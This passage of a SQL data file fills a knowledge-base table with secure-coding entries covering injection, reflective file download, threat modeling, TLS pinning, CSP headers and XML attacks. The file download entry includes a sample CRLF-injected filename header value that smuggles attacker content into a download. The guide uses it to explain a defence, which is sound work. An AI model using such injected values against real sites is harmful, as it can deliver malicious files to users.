sanitizing your user-inputNEWLINEsubmitted towards your application.NEWLINENEWLINEAlways validate your user-input on a high level(server side constraint). Whenever yourNEWLINEapplication expects an integer you should validate and check whether the user submittedNEWLINEinput really is what you expected it to be and otherwise you terminate and log the request.NEWLINE', 'HTML injections'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# Debug enablingNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINESometimes it is possible through an "enabling debug parameter" to display technicalNEWLINEinformation within the application. As a result the attacker learns more about theNEWLINEoperation of the application, increasing his attack vector.NEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINEDisable the possibility to enable debug information on a live environment.NEWLINE', 'Debug enabeling'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# Reflective file download and File download injectionsNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEReflective file download occurs whenever an attacker can "forge" a download throughNEWLINEmisconfiguration in your "disposition" and "content type" headers. Instead of havingNEWLINEthe attacker to upload a evil file to the webserver he can now force the browser toNEWLINEdownload a malicious file by abusing these headers and setting the file extension to anyNEWLINEtype he wants.NEWLINENEWLINENow, whenever there is also user-input being reflected back into that download it can beNEWLINEused to forge evil attacks. The attacker can present an evil file to ignorant victim''s whoNEWLINEare trusting the domain of which the download was presented from.NEWLINENEWLINEFile download injection is a similar type of attack except this attack is made possibleNEWLINEwhenever there is user-input that is reflected into the "filename=" parameter in theNEWLINE"disposition" header. The attacker again can force the browser to download a file with hisNEWLINEown choice of extension and set the content of this file by injecting this directlyNEWLINEinto the response like: filename=evil.bat%0A%0D%0A%0DinsertEvilStringHereNEWLINENEWLINEWhenever the user now opens the downloaded file the attacker can gain full control overNEWLINEthe targets device.NEWLINENEWLINE## Solution:NEWLINENEWLINEFirst of all never use user-input directly into your headers since an attacker can nowNEWLINEtake control over it.NEWLINENEWLINESecondly you should check if a filename really does exist beforeNEWLINEpresenting it towards the users. You could also create a whitelist of all files whichNEWLINEare allowed to be downloaded and terminate requests whenever they do not match.NEWLINENEWLINEAlso you should disable the use of "path parameters". It increases the attackers attackNEWLINEvector and these parameters also cause a lot of other vulnerabilities.NEWLINENEWLINEAnd last you should sanitize and encode all your user-input as much as possible.NEWLINEReflective file downloads depends on user-input being reflected in the response header.NEWLINEWhenever this input has been sanitized and encoded it should not do any harm to anyNEWLINEsystem it is being executed on.NEWLINE', 'RFD and file download injections'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# Identify all application componentsNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEWhen you are building an application you first want to map where you are placingNEWLINEsource files, libraries and executables.NEWLINENEWLINEWith these components identified and mapped, it becomes transparent where possibleNEWLINEpitfalls might be in your application and increases the maintainability of theNEWLINEsystem. Also you have an indicator where possible reinforcements have to beNEWLINEimplemented to avoid attacks.(i.e places where your application contains executable''s)NEWLINENEWLINE## Solution:NEWLINENEWLINEVerify that all application components (either individual or groups of source files,NEWLINElibraries, and/or executables) that are present in the application are identified.NEWLINENEWLINEWhen you identified these components you may want to map and document them in order toNEWLINEhave a quick reference to this infrastructure when needed.NEWLINE', 'identify all application components'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# Identify all external dependenciesNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINESometimes your application has certain external dependencies which may stronglyNEWLINEinfluence your application''s operation. These external dependenciesNEWLINEmight become an attackers target since compromising that service might lead toNEWLINEa DoS of your system or influence the system in such a way it leaves room for otherNEWLINEattacks.NEWLINENEWLINE## Solution:NEWLINENEWLINEFirst you must identify which external dependencies your application relays onNEWLINEfor its operation. Second, there should be a fail safe implemented should this dependency everNEWLINEfail to deliver its services towards your application.NEWLINE', 'identify external dependencies'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# High level architecture should be defined.NEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEWhenever you are developing an application you want to map all the architectureNEWLINEit contains. Whenever there are breaches, updates, or other escalations it makes itNEWLINEeasy and transparent for forensics, operators and developers to do their job as fast asNEWLINEpossible.NEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINEVerify that a high-level architecture for the application has been defined. This meansNEWLINEsome sort of a technical resign has to be composed about this architecture and all theNEWLINEelements it provides. This gives a visual representation about your application andNEWLINEmakes it easier to work through.NEWLINENEWLINEWhile you are mapping your application architecture you should also addNEWLINEall other components your application contains in terms of business functions and/orNEWLINEsecurity functions they provide.  NEWLINENEWLINEWhen you map these components it becomes more transparent about different types ofNEWLINEsecurity mitigations that might be forgotten for some of your business functions. BecauseNEWLINEagain, you now own a visual representation of this logic. Your application also becomesNEWLINEmore manageable in terms of keeping up with the latest security updates and patches andNEWLINEgives you a better view of obsolete configurations, functions and components whichNEWLINEcan be removed from the system.NEWLINE', 'High level architecture should be defined'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# Threat modelingNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEThreat modeling is a procedure for optimizing Network/ Application/ Internet Security byNEWLINEidentifying objectives and vulnerabilities, and then defining countermeasures to prevent,NEWLINEor mitigate the effects of, threats to the system. A threat is a potential or actualNEWLINEundesirable event that may be malicious (such as DoS attack) or incidentalNEWLINE(failure of a Storage Device). Threat modeling is a planned activity for identifying andNEWLINEassessing application threats and vulnerabilities.NEWLINENEWLINE## Solution:NEWLINENEWLINEThreat modeling is best applied continuously throughout a software development project.NEWLINEThe process is essentially the same at different levels of abstraction, although theNEWLINEinformation gets more and more granular throughout the life-cycle. Ideally, a high-levelNEWLINEthreat model should be defined in the concept or planning phase, and then refinedNEWLINEthroughout the life-cycle. As more details are added to the system, new attack vectors areNEWLINEcreated and exposed. The ongoing threat modeling process should examine, diagnose, andNEWLINEaddress these threats.NEWLINENEWLINENote that it is a natural part of refining a system for new threats to be exposed.NEWLINEFor example, when you select a particular technology -- such as Java for example --NEWLINEyou take on the responsibility to identify the new threats that are created by that choice.NEWLINEEven implementation choices such as using regular expressions for validation introduceNEWLINEpotential new threats to deal with.NEWLINENEWLINEMore in-depth information about threat modeling can be found at:NEWLINEhttps://www.owasp.org/index.php/Application_Threat_ModelingNEWLINE', 'Threat modeling'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# Differential analysis attackNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEWhenever an attacker sends a request to the server, in example by means of anNEWLINEauthentication functionality. He can measure the average response time between a requestNEWLINEcontaining a valid username and a request containing a invalid username. TheNEWLINEattacker can now use this differential in response time to enumerate user accounts.NEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINEVerify that all authentication challenges, whether successful or failed, should respondNEWLINEin the same average response time.NEWLINE', 'Differential analysis attack'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# Client side input validationNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEAs web applications become more advanced, an increasing amount of HTML is generated byNEWLINEJavaScript on the client-side rather than by the server. Any time content needs to beNEWLINEchanged without refreshing the entire page, the update must be performed using JavaScript.NEWLINEMost notably, this is the case when a page is updated after an AJAX request.NEWLINENEWLINEXSS vulnerabilities can be present not only in your website''s server-side code, but alsoNEWLINEin your website''s client-side JavaScript code. Consequently, even with completelyNEWLINEsecure server-side code, the client-side code might still unsafely include user input in aNEWLINEDOM update after the page has loaded. If this happens, the client-side code has enabledNEWLINEan XSS attack through no fault of the server-side code.NEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINEFirst there must be a client side input validation method as you would apply to the serverNEWLINEside. This means you should also apply input rejection as well as typecasting and such.NEWLINEThis is to prevent users from being attacked by XSS attacks which are undetectable byNEWLINEthe server.NEWLINENEWLINERecommended knowledge base items:NEWLINENEWLINE- Positive validation methodNEWLINE- Single input validation controlsNEWLINE- Input rejectionNEWLINE- Input validationNEWLINE', 'Client side validation'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('Positive validation modelNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEThere are two popular methods in handling input validation. The first is blacklistingNEWLINEand the second one is the whitelisting method, also known as a positive validation model.NEWLINENEWLINEThe big disadvantage of the blacklisting model would be that an attacker has a greatNEWLINEdiversity into forging his attack strings and payloads which can make it hard for yourNEWLINEapplication to detect all of them. It would also be very time consuming importing all of NEWLINEthem into your system.NEWLINENEWLINEWhenever you are using a positive validation model you are simply checking for the input NEWLINEyou were expecting as defined in your applications operation, for example:NEWLINENEWLINELet''s say you have a form and was expecting the form to return the value of a check-box.NEWLINEThis would be a fixed value, yes or no. Whenever the value diverges of the expectedNEWLINEinput as was intended in the applications operation you can now assume there was anNEWLINEintercepting proxy tampering these values and act accordingly to it.NEWLINENEWLINESame goes for whenever you were expecting just a string, integer, alphanumeric characterNEWLINEor even special strings such as names as an o''reily.NEWLINENEWLINEThis methods also makes your code clear, transparent and highly maintainable.NEWLINENEWLINE## Solution:NEWLINENEWLINEFirst there must be a client side input validation method as you would apply to the serverNEWLINEside. This means you should also apply input rejection as well as typecasting and such.NEWLINEThis is to prevent users from being attacked by XSS attacks which are undetectable byNEWLINEthe server.NEWLINENEWLINERecommended knowledge base items:NEWLINENEWLINE- Single input validation controlsNEWLINE- Input rejectionNEWLINE- Input validationNEWLINENEWLINENEWLINENEWLINENEWLINE   NEWLINE', 'Positive validation model'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# TLS certificate public key pinningNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEPinning is the process of associating a host with their expected X509 certificate orNEWLINEpublic key. Once a certificate or public key is known or seen for a host, the certificateNEWLINEor public key is associated or ''pinned'' to the host. If more than one certificate orNEWLINEpublic key is acceptable, then the program holds a pinsetNEWLINE(taking from Jon Larimer and Kenny Root Google I/O talk). In this case, the advertisedNEWLINEidentity must match one of the elements in the pinset.NEWLINENEWLINE## Solution:NEWLINENEWLINEThe idea is to re-use the existing protocols and infrastructure, but use them in aNEWLINEhardened manner. For re-use, a program would keep doing the things it used to do whenNEWLINEestablishing a secure connection.NEWLINENEWLINETo harden the channel, the program would take advantage of the OnConnect callback offeredNEWLINEby a library, framework or platform. In the callback, the program would verify theNEWLINEremote host''s identity by validating its certificate or public key. While pinning doesNEWLINEnot have to occur in an OnConnect callback, its often most convenient because theNEWLINEunderlying connection information is readily available.NEWLINENEWLINEFor more extended information on different types of implementation please see:NEWLINEhttps://www.owasp.org/index.php/Certificate_and_Public_Key_PinningNEWLINE', 'TLS certificate public key pinning'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# HSTS preload listNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEHTTP Strict-Transport-Security (HSTS) allows sites to specify that they should be accessedNEWLINEvia a secure connection only. The problem is, a user''s first request to a site employingNEWLINEHSTS may not be over HTTPS. A preload list will allow us to ship Firefox with someNEWLINEpre-set HSTS sites that, from the first time they''re accessed in the browser, will requireNEWLINEa secure connection.NEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINEIn order to be included on the HSTS preload list, your site must:NEWLINENEWLINE1. Have a valid certificate (which must expire before 2016 if it uses SHA-1).NEWLINE2. Redirect all HTTP traffic to HTTPS—i.e. be HTTPS only.NEWLINE3. Serve all subdomains over HTTPS, specifically including the www subdomain if a DNSNEWLINErecord for that subdomain exists.NEWLINE4. Serve an HSTS header on the base domain:NEWLINE* Expiry must be at least eighteen weeks (10886400 seconds).NEWLINE* The includeSubdomains token must be specified.NEWLINE* The preload token must be specified.NEWLINE* If you are serving a redirect, that redirect must have the HSTS header, not the page itNEWLINE  redirects to.NEWLINENEWLINEFor more details on HSTS, please see RFC 6797. Note that the preload flag in the HSTSNEWLINEheader is required to confirm and authenticate your submission to the preload list.NEWLINEAn example valid HSTS header:NEWLINENEWLINE    Strict-Transport-Security: max-age=10886400; includeSubDomains; preloadNEWLINENEWLINEAdding your website to the list:NEWLINEhttps://www.chromium.org/hsts     NEWLINENEWLINENEWLINESource:NEWLINEhttps://wiki.mozilla.org/Privacy/Features/HSTS_Preload_ListNEWLINE', 'HSTS preload'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# Robots.txtNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEEach site uses a robots.txt file which allows search engines to provide information.NEWLINEThe robots.txt determines what pages may or may not be indexed by google or yahoo etc.NEWLINEHowever, a common mistake made by programmers is applying a blacklisting method causingNEWLINEthe application displaying sensitive information to attackers.NEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINEInstead of the blacklisting method:NEWLINENEWLINEUser-agent: *NEWLINEDisallow: /squirrelmail/NEWLINEDisallow: /admin/NEWLINEDisallow: /modules/NEWLINENEWLINEYou should use a whitelisting method:NEWLINENEWLINEUser-agent: *NEWLINEDisallow: *NEWLINEAllow: /index.htmlNEWLINEAllow: /home.htmlNEWLINE', 'Robots.txt'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# Forward secrecy cyphersNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEIn cryptography, forward secrecy (FS; also known as perfect forward secrecy, or PFS)NEWLINEis a property of key-agreement protocols ensuring that a session key derived from a setNEWLINEof long-term keys cannot be compromised if one of the long-term keys is compromised in theNEWLINEfuture. The key used to protect transmission of data must not be used to derive anyNEWLINEadditional keys, and if the key used to protect transmission of data is derived from someNEWLINEother keying material, then that material must not be used to derive any more keys.NEWLINEIn this way, compromise of a single key permits access only to data protected by thatNEWLINEsingle key.NEWLINENEWLINE## Solution:NEWLINENEWLINEIn the beginning SSL handshake, the client sends a list of supported ciphersuitesNEWLINE(among other things). The server then picks one of the ciphersuites, based on a ranking,NEWLINEand tells the client which one they will be using.NEWLINENEWLINEThis step is the one that determines whether or not the future connection will haveNEWLINEperfect forward secrecy. Note that, at this point, certificates have not entered theNEWLINEpicture at all. This is because whether or not a connection has perfect forward secrecyNEWLINEis determined by how the session key is derived. And how the session key is derived isNEWLINEdetermined by the ciphersuite in use. So, the ciphersuites that use ephemeralNEWLINEDiffie-Hellman (DHE) or the elliptic-curve variant (ECDHE) will have perfect forwardNEWLINEsecrecy while the other options will not.NEWLINE', 'Forward secrecy ciphers'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# Forward secrecy cyphersNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEOCSP stapling, formally known as the TLS Certificate Status Request extension, is anNEWLINEalternative approach to the Online Certificate Status Protocol (OCSP) for checking theNEWLINErevocation status of X.509 digital certificates. It allows the presenter of aNEWLINEcertificate to bear the resource cost involved in providing OCSP responses by appendingNEWLINE("stapling") a time-stamped OCSP response signed by the CA to the initial TLS Handshake,NEWLINEeliminating the need for clients to contact the CANEWLINENEWLINE## Solution:NEWLINENEWLINEStapling basically means that the certificate holder queries the OCSP server themselves atNEWLINEregular intervals, obtaining a signed time-stamped OCSP response. When the site''s visitorsNEWLINEattempt to connect to the site, this response is included ("stapled") with the TLS/SSLNEWLINEHandshake via the Certificate Status Request extension response (note: the TLS client mustNEWLINEexplicitly include a Certificate Status Request extension in its ClientHello TLS/SSLNEWLINEhandshake message). While it may appear that allowing the site operator to controlNEWLINEverification responses would allow a fraudulent site to issue false verification for aNEWLINErevoked certificate, the stapled responses can''t be forged as they need to be directlyNEWLINEsigned by the certificate authority, not the server. If the client does not receive aNEWLINEstapled response, it will just contact the OCSP server by itself. However, if theNEWLINEclient receives an invalid stapled response, it will abort the connection. The onlyNEWLINEincreased risk of OCSP stapling is that the notification of revocation for a certificateNEWLINEmay be delayed until the last-signed OCSP response expires.NEWLINENEWLINEFor more detailed information about Specification, Deployment, and limitation visit:NEWLINEhttps://en.wikipedia.org/wiki/OCSP_staplingNEWLINE', 'OCSP stapling'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# STRIDENEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINESTRIDE is a collective for a series of vulnerabilities your applications shouldNEWLINEcover in order to harden your applications security.NEWLINENEWLINESTRIDE stands for:NEWLINESpoofingNEWLINETamperingNEWLINERepudiationNEWLINEInformation DisclosureNEWLINEElevation of privilegeNEWLINENEWLINE## Solution:NEWLINENEWLINEIn the context of network security, a spoofing attack is a situation in which one personNEWLINEor program successfully masquerades as another by falsifying data and thereby gaining anNEWLINEillegitimate advantage. There are a lot of different types of spoofing you have to takeNEWLINEinto account for example: TCP/IP, Referrer, ID, or Email spoofing.NEWLINENEWLINEFor Tampering we recommend to read the following knowledge base items:NEWLINENEWLINE- Input validationNEWLINE- Input rejectionNEWLINE- Single input validation controlsNEWLINENEWLINEFor Repudiation we recommend to read the following knowledge base items:NEWLINENEWLINE- Repudiation attacksNEWLINENEWLINEFor information disclosure we recommend to read the following knowledge base items:NEWLINENEWLINE- Verbose error messagingNEWLINE- Session information is not stored server-sideNEWLINE- Sensitive information transmitted by unencrypted methodsNEWLINE- Enforce policies for sensitive data processingNEWLINE- Verify that the session id is never disclosedNEWLINE- Username enumerationNEWLINE- Differential analysisNEWLINENEWLINEFor Elevation of privilege we recommend to read the following knowledge base items:NEWLINENEWLINE- Authentication at a central locationNEWLINE- All authentication controls must fail securelyNEWLINE- Client-side authenticationNEWLINE- Re-authenticationNEWLINE- Privilege escalationNEWLINE- Principle of least privilegeNEWLINE- Authentication at a central locationNEWLINE', 'STRIDE'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# File inclusion attackNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEThe File Inclusion vulnerability allows an attacker to include a file, usually exploitingNEWLINEa "dynamic file inclusion" mechanisms implemented in the target application.NEWLINEThe vulnerability occurs due to the use of user-supplied input without proper validation.NEWLINENEWLINENEWLINEThis can lead to something as outputting the contents of the file, but depending on theNEWLINEseverity, it can also lead to:NEWLINENEWLINE* Code execution on the web serverNEWLINE* Code execution on the client-side such as JavaScript which can lead to other attacksNEWLINE  such as cross site scripting (XSS)NEWLINE* Denial of Service (DoS)NEWLINE* Sensitive Information DisclosureNEWLINENEWLINENEWLINELocal File Inclusion (also known as LFI) is the process of including files, that areNEWLINEalready locally present on the server, through the exploiting of vulnerable inclusionNEWLINEprocedures implemented in the application. This vulnerability occurs, for example, when aNEWLINEpage receives, as input, the path to the file that has to be included and this input isNEWLINEnot properly sanitized, allowing directory traversal characters (such as dot-dot-slash)NEWLINEto be injected. Although most examples point to vulnerable PHP scripts, we should keepNEWLINEin mind that it is also common in other technologies such as JSP, ASP and others.NEWLINENEWLINE## Solution:NEWLINENEWLINEThe most effective solution to eliminate file inclusion vulnerabilities is to avoidNEWLINEpassing user-submitted input to any filesystem/framework API. If this is not possibleNEWLINEthe application can maintain a white list of files, that may be included by the page, andNEWLINEthen use an identifier (for example the index number) to access to the selected file.NEWLINEAny request containing an invalid identifier has to be rejected, in this way there isNEWLINEno attack surface for malicious users to manipulate the path.NEWLINE', 'File inclusion attack'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# Access managementNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEWhenever your application contains administration and management functions you shouldNEWLINEput on restrictions for visiting these functionalities in order to reduce an attackersNEWLINEattack vector on your services since they are not directly accessible for them.NEWLINENEWLINE## Solution:NEWLINENEWLINEVerify that access to administration and management functions within the Web ServiceNEWLINEApplication is limited to web service administrators.NEWLINENEWLINEFor example, they could only be accessible from within a restricted source IP range.NEWLINE', 'Access management'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# JSON, XML schemaNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEWhen adding schema''s to your JSON or XML files you have better control over whatNEWLINEtype of user-input can be supplied in your application. This dramatically decreases anNEWLINEattackers attack vector when implemented the right way. Nonetheless you should alwaysNEWLINEapply your own input validation and rejection as extra layer of defense. This approachNEWLINEis also desirable since you also want to do countering and logging on the usersNEWLINErequests and input.	 NEWLINENEWLINE## Solution:NEWLINENEWLINEVerify that XML or JSON schema are in place and verified before accepting input.NEWLINENEWLINERecommended knowledge base items:NEWLINENEWLINE- Input rejectionNEWLINE- Input validationNEWLINE- Audit logsNEWLINE', 'JSON XML schema'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# Limiting the size of user inputNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEWhenever there is user-input supplied into your application you also want to limitNEWLINEthe size of the user-input to appropriate maximum lengths.NEWLINENEWLINE## Solution:NEWLINENEWLINEVerify that XML or JSON schema are in place and verified before accepting input.NEWLINENEWLINERecommended knowledge base items:NEWLINENEWLINE- Input rejectionNEWLINE- Input validationNEWLINE- Audit logsNEWLINE', 'Limiting user input size'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# Parsing data exchange formatsNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEWhenever you are parsing data exchange formats such as, XML, JSON, CSV, etc, youNEWLINEhave to make sure that whenever these data files contain malicious code this will not beNEWLINEexecuted by your application. You should also not solely depend on your parser to do allNEWLINEthe encoding and escaping for you since there could always be an edge case that doesNEWLINEexecute certain attacks.NEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINEWe highly recommend to do your own escaping, sanitizing, encoding on all data beforeNEWLINEentering your application. The risk also depend on the context of wherever you are puttingNEWLINEthis data into. So before you are doing any mutations with your data after getting it fromNEWLINEthe resources, make sure you have applied the right mitigations.NEWLINENEWLINEAlso another reason to build an extra layer of escaping, sanitizing, encoding routinesNEWLINEin your application is because of the logging you want to apply on the data.NEWLINENEWLINERecommended knowledge base items:NEWLINENEWLINE- Input rejectionNEWLINE- Input validationNEWLINE- Audit logsNEWLINE', 'Parsing data  exchange formats'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# Content security policy headersNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEThe main use of the content security policy header is to, detect, report, and rejectNEWLINEXSS attacks. The core issue in relation to XSS attacks is the browser''s inability toNEWLINEdistinguish between script that''s intended to be part of your application, and scriptNEWLINEthat''s been maliciously injected by a third-party.NEWLINENEWLINEWith the use of CSP(Content security policy) we can tell the browser which script is safeNEWLINEto execute and which scripts are most likely been injected by an attacker.NEWLINENEWLINE## Solution:NEWLINENEWLINEA best practice for implementing CSP in your application would be to externalize allNEWLINEjavascript within the web pages.NEWLINENEWLINESo this:NEWLINE    <script>NEWLINE      function doSomething() {NEWLINE        alert(''Something!'');NEWLINE      }NEWLINE	</script>NEWLINENEWLINE	<button onclick=''doSomething();''>foobar!</button>NEWLINENEWLINEMust become this:NEWLINE	<script src=''doSomething.js''></script>NEWLINE	<button id=''somethingToDo''>Let''s foobar!</button>NEWLINENEWLINEThe header for this code could look something like:NEWLINE    Content-Security-Policy: default-src''self''; object-src''none''; script-src''https://mycdn.com''NEWLINENEWLINESince it is not entirely realistic to implement all javascript on external pages we canNEWLINEapply sort of a cross site request forgery token to your inline javascript. This wayNEWLINEthe browser can again distinguish the difference between code which is part of theNEWLINEapplication against probable malicious injected code, in CSP this is called the ''nonce''.NEWLINEOf course this method is also very applicable on your existing code and designs.NEWLINENEWLINENow, to use this nonce you have to supply your inline script tags with the nonce attribute.NEWLINEFirstly, it''s important that the nonce changes for each response. Otherwise the nonceNEWLINEwould become guessable. So it should also contain a high entropy and should be hard toNEWLINEpredict. Similar to the operation of the CSRF tokens, the nonce becomes impossible forNEWLINEthe attacker to predict making it difficult to execute a successful XSS attack.NEWLINENEWLINEInline javascript example containing nonce:NEWLINE	<script nonce=sfsdf03nceI23wlsgle9h3sdd21>NEWLINE    <!-- Your javscript code -->NEWLINE    </script>NEWLINENEWLINEMatching header example:NEWLINE    Content-Security-Policy: script-src ''nonce-sfsdf03nceI23wlsgle9h3sdd21''NEWLINENEWLINEThere is a whole lot more to learn about the CSP header for in depth implementation inNEWLINEyour application. This knowledge base item just scratches the surface and it would beNEWLINEhighly recommended to gain more in depth knowledge about this powerful header.NEWLINENEWLINE## Very Important:NEWLINEWhen applying the CSP header, although it blocks XSS attacks. YourNEWLINEapplication still remains vulnerable to HTML and other code injections.NEWLINESo this is not a substitute for, validation, sanitizing and encoding of user-input.NEWLINE', 'Content security policy headers'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# Safe javascript and jquery methodsNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEWhenever you are supplying your javascript/jquery with data which is controlled by theNEWLINEuser, you should make sure this data is not supplied towards functions which couldNEWLINEinterpreted the supplied and parse input as code. This could lead to XSS and other codeNEWLINEinjections.NEWLINENEWLINE## Solution:NEWLINENEWLINEBelow we listed some safe functions for whenever it is needed to supply yourNEWLINEjavascript/jquery functions with user-input.NEWLINENEWLINEJQUERY functions:NEWLINE.txt();NEWLINE.val();NEWLINE.parse();NEWLINENEWLINEExample:NEWLINE	<script>NEWLINE	function myFunction() {NEWLINE		$( "p" ).text( "append user-input to paragrapgh safely" );NEWLINE	}NEWLINE	</script>NEWLINENEWLINEJavscript functions:NEWLINE.innerText();   <- not supported by firefoxNEWLINE.textContext(); <- not supported on I.E 8 and lowerNEWLINE.createTextNode();NEWLINE.value();NEWLINENEWLINEExample:NEWLINENEWLINE	<script>NEWLINE	function myFunction() {NEWLINE   		var t = document.createTextNode("append user-input to body safely");NEWLINE    	document.body.appendChild(t);NEWLINE	}NEWLINE	</script>NEWLINE', 'Safe javascript jquery methods'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# Accessible non-parsed dynamic scriptsNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEApplications often include files in other pages. When these files can be directlyNEWLINEapproached by normal users, the operation of the application can be traced because theNEWLINEsource code becomes available. This improves the possibility that the attacker discoversNEWLINEvulnerabilities.NEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINEAlways add the different types of extensions to the web-server handler to parse.NEWLINEThis way the file source cannot be viewed.NEWLINE', 'accessible non'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# WYSIWYG editorsNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEWYSIWYG editors can be a great risk to your web application since it allows directNEWLINEHTML as input to make the user perform styling on their submissions. This is why theNEWLINEeditor should be put under a strict sanitation protocol to prevent injections.NEWLINENEWLINEThe first thing to take into consideration whenever you want to use WYSIWYG editors onNEWLINEyour web application is to use as limited options as possible. Only the options whichNEWLINEare necessary for your applications intended operation should be applied. This decreasesNEWLINEthe attackers attack vector drastically and leaves less room for error in your WYSIWYGNEWLINEeditor in terms of your HTML sanitation.NEWLINENEWLINEWhen providing your web application with an WYSIWYG editor you should also take note thatNEWLINEmost people just want to use bullets, make text bold or underline some text. They mostlyNEWLINEdo not understand half the functionalities the editors are providing.NEWLINENEWLINE## Solution:NEWLINENEWLINEDownload a HTML sanitizer and configure it to your specific needs. When configuring the sanitizer make sureNEWLINEyou disable all unused components. The less options an attacker has to insert into your application the lessNEWLINEhis attack surface becomes. Also before implementing this HTML sanitizer on a production environment haveNEWLINEit first thoroughly examined by security testers since it is a very delicate function.NEWLINE', 'WYSIWYG editors'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# JSON parsingNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEThe eval() function evaluates or executes an argument.NEWLINENEWLINEIf the argument is an expression, eval() evaluates the expression. If the argument is oneNEWLINEor more JavaScript statements, eval() executes the statements.NEWLINENEWLINEThis is exactly the reason why eval() should NEVER be used to parse JSON or otherNEWLINEformats of data which could possible contain malicious code.NEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINEFor the purpose of parsing JSON we would recommend the use of the json.parse functionality.NEWLINEEven though this function is more trusted you should always build your own security checksNEWLINEand encoding routines around the json.parse before mutating the data or passing it on toNEWLINEa view to be displayed in your HTML.NEWLINE', 'Parsing JSON with Javscript'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# Account lock-outNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEAll applications should contain the possibility to lock down accounts for whenever itNEWLINEdetects attacks by/on users. Also you should include options for both soft and hardNEWLINElock-out mechanisms.NEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINESoft lock-out:NEWLINEThis can be a good option for protecting your users against brute force attacks.NEWLINEFor example, whenever the user enters a wrong password three times, the application couldNEWLINElock down the account for a minute in order to slow down the process of brute forcing hisNEWLINEpassword making it less profitable for the attacker to proceed. If u were to implementNEWLINEhard lock-out countermeasures for this example you would achieve a "Dos" by permanentlyNEWLINElocking out accounts.NEWLINENEWLINEHard lock-out:NEWLINEThis type of lockout should be applied whenever you detect a user attacking yourNEWLINEapplication and counter him by means of permanently locking out his account until aNEWLINEresponse team had time to do their forensics. After this process you can decide toNEWLINEgive the user back his account or take further legal actions against him.NEWLINEThis type of approach prevents the attacker from further penetrating your applicationNEWLINEand infrastructure.NEWLINENEWLINENEWLINERecommended knowledge-base items:NEWLINENEWLINE- Audit logsNEWLINE- Privilege based authenticationNEWLINE', 'Account lockout'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# XML AttacksNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEWhenever you are using XML in your application there are a few possibilities forNEWLINEinjections depending on how you are applying XML in your system.NEWLINENEWLINEExtensible Markup Language (XML) is a markup language that defines a set of rules forNEWLINEencoding documents in a format which is both human-readable and machine-readable. It isNEWLINEdefined by the W3C''s XML 1.0 Specification and by several other related specifications,NEWLINEall of which are free open standards.NEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINEItems listed below are recommended to read whenever you are planning to use XML in yourNEWLINEapplication.NEWLINENEWLINERecommended knowledge base items:NEWLINENEWLINE- XML injectionNEWLINE- External DTD parsingNEWLINE- XSLT injectionsNEWLINE- XPath injectionsNEWLINE- XXE injectionsNEWLINE', 'XML'); 
